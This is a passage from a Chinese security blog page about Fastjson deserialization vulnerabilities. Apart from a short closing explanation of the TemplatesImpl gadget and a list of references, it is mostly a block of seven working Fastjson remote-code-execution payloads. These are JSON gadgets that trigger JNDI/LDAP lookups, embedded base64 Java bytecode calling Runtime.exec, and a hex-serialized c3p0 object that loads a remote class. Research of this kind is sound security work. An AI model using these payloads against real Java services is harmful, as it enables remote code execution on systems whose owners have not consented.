+<li>生成的Java类，会执行构造函数，也就是<code>Runtime.getRuntime().exec()</code>导致命令执行。</li>
+</ol>
+<p><img src="/2020/02/27/Fastjson-deserialization/templatesimpl-demo-runtime.png" alt="templatesimpl-demo-runtime"></p>
+<p>整个过程调用栈如下图</p>
+<p><img src="/2020/02/27/Fastjson-deserialization/templatesimpl-stack.png" alt="templatesimpl-stack"></p>
+<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>fastjson中其他链可以参考<code>@type</code>黑名单，项目地址 <a href="https://github.com/LeadroyaL/fastjson-blacklist" target="_blank" rel="noopener">https://github.com/LeadroyaL/fastjson-blacklist</a> </p>
+<p>部分RCE payload记录，来自 <a href="https://paper.seebug.org/1192/" target="_blank" rel="noopener">https://paper.seebug.org/1192/</a> </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">payload1:</span><br><span class="line">&#123;</span><br><span class="line">  &quot;rand1&quot;: &#123;</span><br><span class="line">    &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">    &quot;dataSourceName&quot;: &quot;ldap:&#x2F;&#x2F;localhost:1389&#x2F;Object&quot;,</span><br><span class="line">    &quot;autoCommit&quot;: true</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2:</span><br><span class="line">&#123;</span><br><span class="line">  &quot;rand1&quot;: &#123;</span><br><span class="line">    &quot;@type&quot;: &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,</span><br><span class="line">    &quot;_bytecodes&quot;: [</span><br><span class="line">      &quot;yv66vgAAADQAJgoAAwAPBwAhBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAARBYUFhAQAMSW5uZXJDbGFzc2VzAQAdTGNvbS9sb25nb2ZvL3Rlc3QvVGVzdDMkQWFBYTsBAApTb3VyY2VGaWxlAQAKVGVzdDMuamF2YQwABAAFBwATAQAbY29tL2xvbmdvZm8vdGVzdC9UZXN0MyRBYUFhAQAQamF2YS9sYW5nL09iamVjdAEAFmNvbS9sb25nb2ZvL3Rlc3QvVGVzdDMBAAg8Y2xpbml0PgEAEWphdmEvbGFuZy9SdW50aW1lBwAVAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwAFwAYCgAWABkBAARjYWxjCAAbAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAHQAeCgAWAB8BABNBYUFhNzQ3MTA3MjUwMjU3NTQyAQAVTEFhQWE3NDcxMDcyNTAyNTc1NDI7AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAIwoAJAAPACEAAgAkAAAAAAACAAEABAAFAAEABgAAAC8AAQABAAAABSq3ACWxAAAAAgAHAAAABgABAAAAHAAIAAAADAABAAAABQAJACIAAAAIABQABQABAAYAAAAWAAIAAAAAAAq4ABoSHLYAIFexAAAAAAACAA0AAAACAA4ACwAAAAoAAQACABAACgAJ&quot;</span><br><span class="line">    ],</span><br><span class="line">    &quot;_name&quot;: &quot;aaa&quot;,</span><br><span class="line">    &quot;_tfactory&quot;: &#123;&#125;,</span><br><span class="line">    &quot;_outputProperties&quot;: &#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload3:</span><br><span class="line">&#123;</span><br><span class="line">  &quot;rand1&quot;: &#123;</span><br><span class="line">    &quot;@type&quot;: &quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,</span><br><span class="line">    &quot;properties&quot;: &#123;</span><br><span class="line">      &quot;data_source&quot;: &quot;ldap:&#x2F;&#x2F;localhost:1389&#x2F;Object&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload4:</span><br><span class="line">&#123;</span><br><span class="line">  &quot;rand1&quot;: &#123;</span><br><span class="line">    &quot;@type&quot;: &quot;org.springframework.beans.factory.config.PropertyPathFactoryBean&quot;,</span><br><span class="line">    &quot;targetBeanName&quot;: &quot;ldap:&#x2F;&#x2F;localhost:1389&#x2F;Object&quot;,</span><br><span class="line">    &quot;propertyPath&quot;: &quot;foo&quot;,</span><br><span class="line">    &quot;beanFactory&quot;: &#123;</span><br><span class="line">      &quot;@type&quot;: &quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;,</span><br><span class="line">      &quot;shareableResources&quot;: [</span><br><span class="line">        &quot;ldap:&#x2F;&#x2F;localhost:1389&#x2F;Object&quot;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload5:</span><br><span class="line">&#123;</span><br><span class="line">  &quot;rand1&quot;: Set[</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;@type&quot;: &quot;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&quot;,</span><br><span class="line">    &quot;beanFactory&quot;: &#123;</span><br><span class="line">      &quot;@type&quot;: &quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;,</span><br><span class="line">      &quot;shareableResources&quot;: [</span><br><span class="line">        &quot;ldap:&#x2F;&#x2F;localhost:1389&#x2F;obj&quot;</span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;adviceBeanName&quot;: &quot;ldap:&#x2F;&#x2F;localhost:1389&#x2F;obj&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;@type&quot;: &quot;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&quot;</span><br><span class="line">  &#125;</span><br><span class="line">]&#125;</span><br><span class="line"></span><br><span class="line">payload6:</span><br><span class="line">&#123;</span><br><span class="line">  &quot;rand1&quot;: &#123;</span><br><span class="line">    &quot;@type&quot;: &quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;,</span><br><span class="line">    &quot;userOverridesAsString&quot;: &quot;HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400074578706c6f6974740016687474703a2f2f6c6f63616c686f73743a383038302f740003466f6f;&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload7:</span><br><span class="line">&#123;</span><br><span class="line">  &quot;rand1&quot;: &#123;</span><br><span class="line">    &quot;@type&quot;: &quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource&quot;,</span><br><span class="line">    &quot;jndiName&quot;: &quot;ldap:&#x2F;&#x2F;localhost:1389&#x2F;Object&quot;,</span><br><span class="line">    &quot;loginTimeout&quot;: 0</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="http://xxlegend.com/2017/05/03/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">http://xxlegend.com/2017/05/03/title- fastjson 远程反序列化poc的构造和分析/</a></p>
+<p><a href="https://paper.seebug.org/1192/" target="_blank" rel="noopener">https://paper.seebug.org/1192/</a></p>
+<p><a href="https://paper.seebug.org/994/" target="_blank" rel="noopener">https://paper.seebug.org/994/</a></p>
+<p><a href="http://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">http://www.mi1k7ea.com/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/</a></p>
+
+                                                                        
+                                    </div>
+                                    <footer class="article-footer">
+                                        <!--<a data-url="http://s31k31.github.io/2020/02/27/Fastjson-deserialization/" data-id="ckcddnd750004syjeae9yaisj" class="article-share-link">
+                                            分享
+                                        </a> -->
+                                        
+                                    </footer>
+
+    </div>
+
+    
+        
+  <nav class="article-nav">
+    
+      <a href="/2020/03/31/iOS-jailbreak/" class="article-nav-link">
+        <strong class="article-nav-caption">前一篇</strong>
+        <div class="article-nav-title">
+          
+            iOS 12.4越狱+配置过程记录
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2019/12/26/Tomcat8.5+_400_hide/" class="article-nav-link">
+        <strong class="article-nav-caption">后一篇</strong>
+        <div class="article-nav-title">Tomcat 8.5版本以上隐藏400报错信息</div>
+      </a>
+    
+  </nav>
+
+
+            
+
+                
+                    
+                        
+                            
+
+</article>
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <ul class="list-inline">
+      <li>&copy; 2020 Seikei&#39;s Blog</li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+<aside class="sidebar">
+  <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/seikei.jpg" alt="Seikei&#39;s Blog"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">Home</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">Archives</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="https://github.com/s31k31" target="_blank" rel="noopener">Github</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="mailto:s31k31@gmail.com">Email</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="搜索">
+        <i class="fe fe-search"></i>
+        搜索
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+</aside>
+
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+
+<script src="/js/ocean.js"></script>
+
+
+</body>
+</html>
